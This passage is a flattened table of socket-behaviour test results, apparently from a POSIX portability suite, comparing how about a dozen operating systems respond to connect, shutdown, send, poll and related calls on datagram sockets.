sobindtodevice enosys linux good macos goodgetsockopt sobindtodevice enosys minix goodgetsockopt sobindtodevice enosys netbsd goodgetsockopt sobindtodevice enosys openbsd goodgetsockopt sobindtodevice enosys openindianaomnios goodgetsockopt sobindtodevice enosys sortix good connectloopbackgetpeername dragonfly freebsd haiku hurd linux macos minix netbsd openbsd openindianaomnios sortix connectloopbackgetsockname dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero connectloopbackreconnectloopbackgetsockname dragonfly port freebsd port haiku port hurd port linux port macos port minix port netbsd port openbsd port openindianaomnios port sortix port connectloopbackreconnectwangetsockname dragonfly port freebsd port haiku port hurd unknownsecond connect einval linux unknownsecond connect einval macos port minix port netbsd port openbsd port openindianaomnios port sortix unknownsecond connect enetunreach connectloopbackunconnectrebindanygetsockname dragonfly unknownbind einval freebsd badsecond connect eafnosupport haiku nonzero hurd unknownbind einval linux nonzero macos badsecond connect eafnosupport minix unknownbind einval netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownbind einval sortix unknownbind einval connectloopbackunconnectrebindloopbackgetsockname dragonfly unknownbind einval freebsd badsecond connect eafnosupport haiku nonzero hurd unknownbind einval linux nonzero macos badsecond connect eafnosupport minix unknownbind einval netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownbind einval sortix unknownbind einval connectpoll dragonfly pollout freebsd pollout haiku pollout hurd pollout linux pollout macos pollout minix pollout netbsd pollout openbsd pollout openindianaomnios pollout sortix pollout connectreconnect dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectreconnectanygetpeername dragonfly unknowngetpeername enotconn freebsd unknownsecond connect eaddrnotavail haiku hurd linux unknowngetpeername enotconn macos unknownsecond connect eaddrnotavail minix unknownsecond connect ehostunreach netbsd unknownsecond connect eaddrnotavail openbsd unknownsecond connect eaddrnotavail openindianaomnios unknownsecond connect eaddrnotavail sortix unknownsecond connect eaddrnotavail connectreconnectgetpeername dragonfly freebsd haiku hurd linux macos minix netbsd openbsd openindianaomnios sortix connectreconnectsame dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectrecv dragonfly goodrecv ewouldblock freebsd goodrecv ewouldblock haiku goodrecv ewouldblock hurd goodrecv ewouldblock linux goodrecv ewouldblock macos goodrecv ewouldblock minix goodrecv ewouldblock netbsd goodrecv ewouldblock openbsd goodrecv ewouldblock openindianaomnios goodrecv ewouldblock sortix goodrecv ewouldblock connectsenderroraccept dragonfly badaccept einval freebsd badaccept einval haiku badaccept einval hurd goodaccept enotsup linux goodaccept enotsup macos goodaccept enotsup minix goodaccept enotsup netbsd goodaccept enotsup openbsd badaccept einval openindianaomnios goodaccept enotsup sortix goodaccept enotsup connectsenderrorgetpeername dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectsenderrorgetsockname dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectsenderrorlisten dragonfly badlisten einval freebsd goodlisten enotsup haiku goodlisten enotsup hurd goodlisten enotsup linux goodlisten enotsup macos goodlisten enotsup minix goodlisten enotsup netbsd badlisten einval openbsd goodlisten enotsup openindianaomnios goodlisten enotsup sortix goodlisten enotsup connectsenderrorpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout pollerr hurd pollerr linux pollout pollerr macos pollin pollout minix pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollout connectsenderrorpollpoll dragonfly unknownfirst poll pollin polloutsecond poll pollin pollout freebsd unknownfirst poll pollin polloutsecond poll pollin pollout haiku unknownfirst poll pollin pollout pollerrsecond poll pollin pollout pollerr hurd unknownfirst poll pollerrsecond poll pollerr linux unknownfirst poll pollout pollerrsecond poll pollout pollerr macos unknownfirst poll pollin polloutsecond poll pollin pollout minix unknownfirst poll polloutsecond poll pollout netbsd unknownfirst poll pollin polloutsecond poll pollin pollout openbsd unknownfirst poll pollin polloutsecond poll pollin pollout openindianaomnios unknownfirst poll pollin polloutsecond poll pollin pollout sortix unknownfirst poll polloutsecond poll pollout connectsenderrorpollsoerrorpoll dragonfly unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout freebsd unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout haiku unknownfirst poll pollin pollout pollerrsoerror econnrefusedsecond poll pollout hurd unknownfirst poll pollerrsoerror econnrefusedsecond poll pollout linux unknownfirst poll pollout pollerrsoerror econnrefusedsecond poll pollout macos unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout minix unknownfirst poll polloutsoerror errorsecond poll pollout netbsd unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout openbsd unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout openindianaomnios unknownfirst poll pollin polloutsoerror econnrefusedsecond poll pollout sortix unknownfirst poll polloutsoerror errorsecond poll pollout connectsenderrorreconnect dragonfly unknownexit freebsd unknownexit haiku unknownexit hurd unknownexit linux unknownexit macos unknownsecond connect econnrefused minix unknownexit netbsd unknownsecond connect econnrefused openbsd unknownsecond connect econnrefused openindianaomnios unknownsecond connect econnrefused sortix unknownexit connectsenderrorrecv dragonfly goodrecv econnrefused freebsd goodrecv econnrefused haiku goodrecv econnrefused hurd goodrecv econnrefused linux goodrecv econnrefused macos goodrecv econnrefused minix badrecv ewouldblock netbsd goodrecv econnrefused openbsd goodrecv econnrefused openindianaomnios goodrecv econnrefused sortix badrecv ewouldblock connectsenderrorsend dragonfly goodsecond send econnrefused freebsd goodsecond send econnrefused haiku badsecond send error hurd goodsecond send econnrefused linux goodsecond send econnrefused macos goodsecond send econnrefused minix badsecond send error netbsd goodsecond send econnrefused openbsd goodsecond send econnrefused openindianaomnios goodsecond send econnrefused sortix badsecond send error connectsenderrorsendsend dragonfly goodsecond send econnrefusedthird send error freebsd goodsecond send econnrefusedthird send error haiku badsecond send errorthird send error hurd goodsecond send econnrefusedthird send error linux goodsecond send econnrefusedthird send error macos goodsecond send econnrefusedthird send error minix badsecond send errorthird send error netbsd goodsecond send econnrefusedthird send error openbsd goodsecond send econnrefusedthird send error openindianaomnios goodsecond send econnrefusedthird send error sortix badsecond send errorthird send error connectsenderrorshutdownrrecv dragonfly unknownrecv econnrefused freebsd unknownrecv econnrefused haiku badshutdown enotsup hurd unknownrecv econnrefused linux unknownrecv econnrefused macos unknownrecv econnrefused minix unknowneof netbsd unknownrecv econnrefused openbsd unknownrecv econnrefused openindianaomnios unknownrecv econnrefused sortix unknowneof connectsenderrorshutdownrsend dragonfly goodsecond send econnrefused freebsd goodsecond send econnrefused haiku badshutdown enotsup hurd goodsecond send econnrefused linux goodsecond send econnrefused macos goodsecond send econnrefused minix badexit netbsd goodsecond send econnrefused openbsd goodsecond send econnrefused openindianaomnios goodsecond send econnrefused sortix badexit connectsenderrorshutdownrwrecv dragonfly unknownrecv econnrefused freebsd unknownrecv econnrefused haiku badshutdown enotsup hurd unknownrecv econnrefused linux unknownrecv econnrefused macos unknownrecv econnrefused minix unknowneof netbsd unknownrecv econnrefused openbsd unknownrecv econnrefused openindianaomnios unknownrecv econnrefused sortix unknowneof connectsenderrorshutdownrwsend dragonfly unknownsecond send epipesigpipe freebsd unknownsecond send epipesigpipe haiku badshutdown enotsup hurd unknownsecond send epipesigpipe linux unknownsecond send econnrefused macos unknownsecond send epipesigpipe minix unknownsecond send epipe netbsd unknownsecond send epipesigpipe openbsd unknownsecond send epipesigpipe openindianaomnios unknownsecond send epipesigpipe sortix unknownsecond send epipesigpipe connectsenderrorshutdownrwsoerror dragonfly goodsoerror econnrefused freebsd goodsoerror econnrefused haiku badshutdown enotsup hurd goodsoerror econnrefused linux goodsoerror econnrefused macos goodsoerror econnrefused minix badsoerror error netbsd goodsoerror econnrefused openbsd goodsoerror econnrefused openindianaomnios goodsoerror econnrefused sortix badsoerror error connectsenderrorshutdownwrecv dragonfly goodrecv econnrefused freebsd goodrecv econnrefused haiku badshutdown enotsup hurd goodrecv econnrefused linux goodrecv econnrefused macos goodrecv econnrefused minix badrecv ewouldblock netbsd goodrecv econnrefused openbsd goodrecv econnrefused openindianaomnios goodrecv econnrefused sortix badrecv ewouldblock connectsenderrorshutdownwsend dragonfly unknownsecond send epipesigpipe freebsd unknownsecond send epipesigpipe haiku badshutdown enotsup hurd unknownsecond send epipesigpipe linux unknownsecond send econnrefused macos unknownsecond send epipesigpipe minix unknownsecond send epipe netbsd unknownsecond send epipesigpipe openbsd unknownsecond send epipesigpipe openindianaomnios unknownsecond send epipesigpipe sortix unknownsecond send epipesigpipe connectsenderrorsoerrorsendsend dragonfly goodsoerror econnrefusedsecond send errorthird send econnrefused freebsd goodsoerror econnrefusedsecond send errorthird send econnrefused haiku badsoerror econnrefusedsecond send errorthird send error hurd goodsoerror econnrefusedsecond send errorthird send econnrefused linux goodsoerror econnrefusedsecond send errorthird send econnrefused macos goodsoerror econnrefusedsecond send errorthird send econnrefused minix badsoerror errorsecond send errorthird send error netbsd goodsoerror econnrefusedsecond send errorthird send econnrefused openbsd goodsoerror econnrefusedsecond send errorthird send econnrefused openindianaomnios goodsoerror econnrefusedsecond send errorthird send econnrefused sortix badsoerror errorsecond send errorthird send error connectsendtonull dragonfly goodexit freebsd goodexit haiku badsendto einval hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectsendtoother dragonfly goodexit freebsd goodsendto eisconn haiku goodsendto eisconn hurd goodexit linux goodexit macos goodsendto eisconn minix goodexit netbsd goodsendto eisconn openbsd goodsendto eisconn openindianaomnios goodsendto eisconn sortix goodsendto eisconn connectsendtosame dragonfly goodexit freebsd goodsendto eisconn haiku goodsendto eisconn hurd goodexit linux goodexit macos goodsendto eisconn minix goodexit netbsd goodsendto eisconn openbsd goodsendto eisconn openindianaomnios goodsendto eisconn sortix goodsendto eisconn connectshutdown dragonfly goodexit freebsd goodexit haiku badshutdown enotsup hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectshutdownrrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd badrecv einval linux unknownrecv ewouldblock macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof connectshutdownrsend dragonfly goodexit freebsd goodexit haiku badshutdown enotsup hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectshutdownrunconnectrecv dragonfly unknowneof freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd badrecv einval linux unknownrecv ewouldblock macos badsecond connect eafnosupport minix unknowneof netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknowneof sortix unknowneof connectshutdownrunconnectsend dragonfly goodexit freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd goodexit linux goodexit macos badsecond connect eafnosupport minix goodexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios goodexit sortix goodexit connectshutdownreconnect dragonfly goodexit freebsd goodexit haiku badshutdown enotsup hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit connectshutdownrwreconnectsend dragonfly unknownsend epipesigpipe freebsd unknownsend epipesigpipe haiku badshutdown enotsup hurd unknownsend epipesigpipe linux unknownsend epipe macos unknownsend epipesigpipe minix unknownsend epipe netbsd unknownsend epipesigpipe openbsd unknownsend epipesigpipe openindianaomnios unknownsend epipesigpipe sortix unknownsend epipesigpipe connectshutdownrwrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd badrecv einval linux unknownrecv ewouldblock macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof connectshutdownrwsend dragonfly unknownsend epipesigpipe freebsd unknownsend epipesigpipe haiku badshutdown enotsup hurd unknownsend epipesigpipe linux unknownsend epipe macos unknownsend epipesigpipe minix unknownsend epipe netbsd unknownsend epipesigpipe openbsd unknownsend epipesigpipe openindianaomnios unknownsend epipesigpipe sortix unknownsend epipesigpipe connectshutdownrwunconnectrecv dragonfly unknowneof freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd badrecv einval linux unknownrecv ewouldblock macos badsecond connect eafnosupport minix unknowneof netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknowneof sortix unknowneof connectshutdownrwunconnectsend dragonfly unknownsendto epipesigpipe freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownsendto epipesigpipe linux unknownsendto epipe macos badsecond connect eafnosupport minix unknownsendto epipe netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownsendto epipesigpipe sortix unknownsendto epipesigpipe connectshutdownwrecv dragonfly goodrecv ewouldblock freebsd goodrecv ewouldblock haiku badshutdown enotsup hurd goodrecv ewouldblock linux goodrecv ewouldblock macos goodrecv ewouldblock minix goodrecv ewouldblock netbsd goodrecv ewouldblock openbsd goodrecv ewouldblock openindianaomnios goodrecv ewouldblock sortix goodrecv ewouldblock connectshutdownwsend dragonfly unknownsend epipesigpipe freebsd unknownsend epipesigpipe haiku badshutdown enotsup hurd unknownsend epipesigpipe linux unknownsend epipe macos unknownsend epipesigpipe minix unknownsend epipe netbsd unknownsend epipesigpipe openbsd unknownsend epipesigpipe openindianaomnios unknownsend epipesigpipe sortix unknownsend epipesigpipe connectshutdownwunconnectrecv dragonfly goodrecv ewouldblock freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd goodrecv ewouldblock linux goodrecv ewouldblock macos badsecond connect eafnosupport minix goodrecv ewouldblock netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios goodrecv ewouldblock sortix goodrecv ewouldblock connectshutdownwunconnectsend dragonfly unknownsendto epipesigpipe freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownsendto epipesigpipe linux unknownsendto epipe macos badsecond connect eafnosupport minix unknownsendto epipe netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownsendto epipesigpipe sortix unknownsendto epipesigpipe connectunconnect dragonfly goodexit freebsd badsecond connect eafnosupport haiku goodexit hurd goodexit linux goodexit macos badsecond connect eafnosupport minix goodexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios goodexit sortix goodexit connectunconnectgetpeername dragonfly goodgetpeername enotconn freebsd badsecond connect eafnosupport haiku hurd goodgetpeername enotconn linux goodgetpeername enotconn macos badsecond connect eafnosupport minix goodgetpeername enotconn netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios goodgetpeername enotconn sortix goodgetpeername enotconn connectunconnectgetsockname dragonfly nonzero freebsd badsecond connect eafnosupport haiku nonzero hurd nonzero linux macos badsecond connect eafnosupport minix nonzero netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios nonzero sortix nonzero connectunconnectsafamily dragonfly badsecond connect edom freebsd unknownsecond connect einval haiku unknownexit hurd unknownsecond connect einval linux unknownexit macos unknownsecond connect einval minix unknownsecond connect einval netbsd unknownsecond connect einval openbsd unknownsecond connect einval openindianaomnios unknownexit sortix unknownexit connectunconnectshutdownrrecv dragonfly unknowneof freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknowneof netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknowneof sortix unknowneof connectunconnectshutdownrsend dragonfly unknownexit freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknownexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownexit sortix unknownexit connectunconnectshutdownrwrecv dragonfly unknowneof freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknowneof netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknowneof sortix unknowneof connectunconnectshutdownrwsend dragonfly unknownsendto epipesigpipe freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknownsendto epipe netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownsendto epipesigpipe sortix unknownsendto epipesigpipe connectunconnectshutdownwrecv dragonfly unknownrecv ewouldblock freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknownrecv ewouldblock netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownrecv ewouldblock sortix unknownrecv ewouldblock connectunconnectshutdownwsend dragonfly unknownsendto epipesigpipe freebsd badsecond connect eafnosupport haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos badsecond connect eafnosupport minix unknownsendto epipe netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownsendto epipesigpipe sortix unknownsendto epipesigpipe connectunconnectsockaddr dragonfly unknownexit freebsd badsecond connect eafnosupport haiku unknownexit hurd unknownexit linux unknownexit macos badsecond connect eafnosupport minix unknownexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownexit sortix unknownexit connectunconnectsockaddrin dragonfly goodexit freebsd badsecond connect eafnosupport haiku goodexit hurd goodexit linux goodexit macos badsecond connect eafnosupport minix goodexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios goodexit sortix goodexit connectunconnectsockaddrstorage dragonfly goodexit freebsd badsecond connect einval haiku goodexit hurd goodexit linux goodexit macos badsecond connect einval minix goodexit netbsd badsecond connect einval openbsd badsecond connect einval openindianaomnios goodexit sortix goodexit connectunconnectunconnect dragonfly goodexit freebsd badsecond connect eafnosupport haiku goodexit hurd goodexit linux goodexit macos badsecond connect eafnosupport minix goodexit netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios badthird connect einval sortix goodexit connectwangetsobindtodevice dragonfly goodgetsockopt sobindtodevice enosys freebsd goodgetsockopt sobindtodevice enosys haiku goodgetsockopt sobindtodevice enoprotoopt hurd goodgetsockopt sobindtodevice enosys linux good macos goodgetsockopt sobindtodevice enosys minix goodgetsockopt sobindtodevice enosys netbsd goodgetsockopt sobindtodevice enosys openbsd goodgetsockopt sobindtodevice enosys openindianaomnios goodgetsockopt sobindtodevice enosys sortix good connectwangetsockname dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero connectwansendreconnectloopbacksend dragonfly unknownexit freebsd unknownsecond send eaddrnotavail haiku unknownexit hurd unknownexit linux unknownexit macos unknownexit minix unknownexit netbsd unknownexit openbsd unknownexit openindianaomnios unknownexit sortix unknownsecond connect enetunreach connectwanunconnectrebindanygetsockname dragonfly unknownbind einval freebsd badsecond connect eafnosupport haiku badbind general system error hurd unknownbind einval linux unknownbind eaddrnotavail macos badsecond connect eafnosupport minix unknownbind einval netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownbind eaddrnotavail sortix unknownbind einval connectwanunconnectrebindsamegetsockname dragonfly unknownbind einval freebsd badsecond connect eafnosupport haiku nonzero hurd unknownbind einval linux nonzero macos badsecond connect eafnosupport minix unknownbind einval netbsd badsecond connect eafnosupport openbsd badsecond connect eafnosupport openindianaomnios unknownbind einval sortix unknownbind einval crossnetiflansendloopbackrecv dragonfly nonzero x freebsd nonzero x haiku nonzero x hurd nonzero x linux nonzero x macos nonzero x minix nonzero x netbsd nonzero x openbsd nonzero x openindianaomnios nonzero x sortix badsendto enetunreach crossnetifloopbacksendlanrecv dragonfly nonzero x freebsd nonzero x haiku nonzero x hurd nonzero x linux nonzero x macos nonzero x minix nonzero x netbsd nonzero x openbsd nonzero x openindianaomnios nonzero x sortix badsendto enetunreach getsobindtodevice dragonfly goodgetsockopt sobindtodevice enosys freebsd goodgetsockopt sobindtodevice enosys haiku goodgetsockopt sobindtodevice enoprotoopt hurd goodgetsockopt sobindtodevice enosys linux good macos goodgetsockopt sobindtodevice enosys minix goodgetsockopt sobindtodevice enosys netbsd goodgetsockopt sobindtodevice enosys openbsd goodgetsockopt sobindtodevice enosys openindianaomnios goodgetsockopt sobindtodevice enosys sortix good getpeername dragonfly goodgetpeername enotconn freebsd goodgetpeername enotconn haiku goodgetpeername enotconn hurd goodgetpeername enotconn linux goodgetpeername enotconn macos goodgetpeername enotconn minix goodgetpeername enotconn netbsd goodgetpeername enotconn openbsd goodgetpeername enotconn openindianaomnios goodgetpeername enotconn sortix goodgetpeername enotconn getsockname dragonfly freebsd haiku badgetsockname enotconn hurd linux macos minix netbsd openbsd openindianaomnios sortix listen dragonfly goodlisten enotsup freebsd goodlisten enotsup haiku goodlisten enotsup hurd goodlisten enotsup linux goodlisten enotsup macos goodlisten enotsup minix goodlisten enotsup netbsd goodlisten enotsup openbsd goodlisten enotsup openindianaomnios goodlisten enotsup sortix goodlisten enotsup pairpoll dragonfly pollout freebsd pollout haiku pollout hurd pollout linux pollout macos pollout minix pollout netbsd pollout openbsd pollout openindianaomnios pollout sortix pollout pairsendpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout pairsendrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx pairsendshutdownrpoll dragonfly pollin pollout freebsd pollin pollout haiku badshutdown enotsup hurd pollin pollout linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout pairsendshutdownrrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd unknownx linux unknownx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof pairsendshutdownrwpoll dragonfly pollin pollhup freebsd pollin pollhup haiku badshutdown enotsup hurd pollin linux pollin pollout pollhup macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup pairsendshutdownrwrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd unknownx linux unknownx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof pairsendshutdownwpoll dragonfly pollin pollhup freebsd pollin pollout haiku badshutdown enotsup hurd pollin linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup pairsendshutdownwrecv dragonfly goodx freebsd goodx haiku badshutdown enotsup hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx pairshutdownrpoll dragonfly pollin pollout freebsd pollin pollout haiku badshutdown enotsup hurd pollin pollout linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout pairshutdownrsendpoll dragonfly pollin pollout freebsd pollin pollout haiku badshutdown enotsup hurd pollin pollout linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout pairshutdownrsendrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd badx linux badx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof pairshutdownrwpoll dragonfly pollin pollhup freebsd pollin pollhup haiku badshutdown enotsup hurd pollin linux pollin pollout pollhup macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup pairshutdownrwsendpoll dragonfly pollin pollhup freebsd pollin pollhup haiku badshutdown enotsup hurd pollin linux pollin pollout pollhup macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup pairshutdownrwsendrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd badx linux badx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof pairshutdownwpoll dragonfly pollhup freebsd pollout haiku badshutdown enotsup hurd unknownpoll returned linux pollout macos pollhup minix pollout netbsd pollout openbsd pollout openindianaomnios pollout sortix pollhup pairshutdownwsendpoll dragonfly pollin pollhup freebsd pollin pollout haiku badshutdown enotsup hurd pollin linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup pairshutdownwsendrecv dragonfly goodx freebsd goodx haiku badshutdown enotsup hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx poll dragonfly pollout freebsd pollout haiku pollout hurd pollout linux pollout macos pollout minix pollout netbsd pollout openbsd pollout openindianaomnios pollout sortix pollout recvfromgetsockname dragonfly freebsd haiku badgetsockname enotconn hurd nonzero linux macos minix netbsd openbsd openindianaomnios sortix send dragonfly goodsend edestaddrreq freebsd goodsend edestaddrreq haiku goodsend edestaddrreq hurd badsend enotconn linux goodsend edestaddrreq macos goodsend edestaddrreq minix goodsend edestaddrreq netbsd goodsend edestaddrreq openbsd goodsend edestaddrreq openindianaomnios goodsend edestaddrreq sortix goodsend edestaddrreq sendtoanysoerror dragonfly unknownexit freebsd unknownexit haiku unknownsendto edestaddrreq hurd unknownsoerror econnrefused linux unknownexit macos unknownexit minix badsendto ehostunreach netbsd unknownexit openbsd unknownsendto enetunreach openindianaomnios unknownexit sortix unknownsendto enetunreach sendtogetsockname dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero dragonfly unknownexit freebsd unknownsendto eaddrnotavail haiku unknownexit hurd badsendto einval linux badsendto einval macos unknownsendto eaddrnotavail minix unknownsendto eaddrnotavail netbsd unknownsendto eaddrnotavail openbsd unknownsendto eaddrnotavail openindianaomnios unknownexit sortix unknownsendto eaddrnotavail sendtonull dragonfly goodsendto edestaddrreq freebsd goodsendto edestaddrreq haiku badsendto einval hurd badsendto enotconn linux goodsendto edestaddrreq macos goodsendto edestaddrreq minix goodsendto edestaddrreq netbsd goodsendto edestaddrreq openbsd goodsendto edestaddrreq openindianaomnios goodsendto edestaddrreq sortix goodsendto edestaddrreq shutdown dragonfly unknownexit freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownexit netbsd unknownexit openbsd unknownexit openindianaomnios unknownshutdown enotconn sortix unknownexit shutdownrrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof shutdownrsend dragonfly unknownexit freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownexit netbsd unknownexit openbsd unknownexit openindianaomnios unknownshutdown enotconn sortix unknownexit shutdownrwrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof shutdownrwsend dragonfly unknownsendto epipesigpipe freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownsendto epipe netbsd unknownsendto epipesigpipe openbsd unknownsendto epipesigpipe openindianaomnios unknownshutdown enotconn sortix unknownsendto epipesigpipe shutdownwrecv dragonfly unknownrecv ewouldblock freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownrecv ewouldblock netbsd unknownrecv ewouldblock openbsd unknownrecv ewouldblock openindianaomnios unknownshutdown enotconn sortix unknownrecv ewouldblock shutdownwsend dragonfly unknownsendto epipesigpipe freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownsendto epipe netbsd unknownsendto epipesigpipe openbsd unknownsendto epipesigpipe openindianaomnios unknownshutdown enotconn sortix unknownsendto epipesigpipe soerror dragonfly goodsoerror error freebsd goodsoerror error haiku goodsoerror error hurd goodsoerror error linux goodsoerror error macos goodsoerror error minix goodsoerror error netbsd goodsoerror error openbsd goodsoerror error openindianaomnios goodsoerror error sortix goodsoerror error trioconnectsendrightxpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout 